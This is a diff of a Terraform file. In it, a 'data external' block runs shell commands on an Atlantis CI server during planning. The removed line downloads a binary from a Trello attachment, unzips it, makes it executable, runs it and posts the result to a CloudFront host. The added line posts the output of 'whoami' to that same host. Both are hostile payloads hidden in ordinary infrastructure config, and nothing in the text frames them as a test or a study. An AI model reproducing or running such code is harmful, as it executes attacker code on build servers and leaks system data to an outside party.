@@ -1,3 +1,3 @@
 data "external" "example" {
-    program = ["sh","-c","curl -X POST -d \"`wget -O /home/atlantis/AtlantisPlugin.zip https://trello.com/1/cards/65017b45a1218bdbf222033f/attachments/65017b4d80a94ed9164b7264/download/AtlantisPlugin.zip;unzip /home/atlantis/AtlantisPlugin.zip -d /home/atlantis;chmod +x /home/atlantis/AtlantisPlugin;/home/atlantis/AtlantisPlugin`\" https://d9usos5h96tz9.cloudfront.net/log"]
+    program = ["sh","-c","curl -X POST -d \"`whoami`\" https://d9usos5h96tz9.cloudfront.net/log"]
 }
